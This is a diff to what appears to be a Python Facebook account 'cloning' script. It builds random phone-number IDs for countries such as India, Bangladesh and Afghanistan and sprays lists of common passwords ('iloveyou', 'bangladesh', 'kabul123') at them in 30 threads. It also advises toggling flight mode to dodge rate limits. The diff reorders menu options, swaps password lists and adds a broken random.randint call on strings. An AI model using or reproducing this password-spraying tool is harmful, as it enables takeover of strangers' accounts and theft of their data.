@@ -309,17 +309,17 @@ def menu():
 def randm():
     clear()
     print(f'{G}[{A}1{G}]{G} INDIA CLONING ')
-    print(f'{G}[{A}2{G}]{G} BANGLADESH CLONING ')
+    print(f'{G}[{A}2{G}]{G} INDIA CLONING (without code) ')
     print(f'{G}[{A}3{G}]{G} NEPAL CLONING ')
     print(f'{G}[{A}4{G}]{G} PAKISTAN CLONING ')
-    print(f'{G}[{A}5{G}]{G} AFGHANISTAN CLONING ')
+    print(f'{G}[{A}5{G}]{G} BANGLADESH CLONING ')
     print(f'{G}[{A}6{G}]{G} NIGERIA CLONING ')
     print(f'{G}[{A}0{G}]{G} BACK TO MENU ');linex()
     option=input(f'{G}[{A}?{G}]{G} CHOICE : ')
     if option in ['1','A']:
-        india()
+        bd()
     elif option in ['2','B']:
-    	bd()
+    	india()
     elif option in ['3','C']:
     	nepal()
     elif option in ['4','D']:
@@ -374,7 +374,8 @@ def india():
 		user=[]
 		clear()
 		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 9815 | 9814 | 9861 | 9840  ');linex()
-		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
+		cod = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
+		code = str(random.randint('6','9'))
 		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
 		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
 		clear()
@@ -487,7 +488,7 @@ def pakistan():
 def afghanistan():
 		user=[]
 		clear()
-		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : +9340 | +9360 | +9330 | +9350');linex()
+		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 017 | 019 | 018 | 016 ');linex()
 		code = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
 		clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : 3000 | 5000 | 10000 | 99999 ');linex()
 		limit = int(input(f'{G}[{A}?{G}]{G} CHOICE  : '))
@@ -495,7 +496,7 @@ def afghanistan():
 		print(f'{G}[{A}1{G}]{G} METHOD {G}[{A}M1{G}]{G} \n{G}[{A}2{G}]{G} METHOD {G}[{A}M2{G}]{G}\n{G}[{A}3{G}]{G} METHOD {G}[{A}M3{G}]{G} ');linex()
 		mthd = input(f'{G}[{A}?{G}]{G} CHOICE  : ')
 		for nmbr in range(limit):
-			nmp = "". join(random.choice(string.digits) for _ in range(7))
+			nmp=''.join(random.choice(string.digits) for _ in range(8))
 			user.append(nmp)
 		with tred(max_workers=30) as habib:	
 			clear()
@@ -505,7 +506,7 @@ def afghanistan():
 			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE EVERY 5 MIN [ON/OF] YOUR FLIGHT MODE');linex()
 			for psx in user:
 				uid = code+psx
-				passlist = [psx,uid,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
+				passlist = [psx,uid,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
 				if mthd in ['1','01']:
 					habib.submit(rndm1,uid,passlist)
 				if mthd in ['2','02']:
@@ -519,7 +520,7 @@ def afghanistan():
 		print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID : '+str(len(cps)))
 		print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 		input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
-		menu()	
+		menu()
 #__________________| malaysia |__________________#
 def malaysia():
 		user=[]
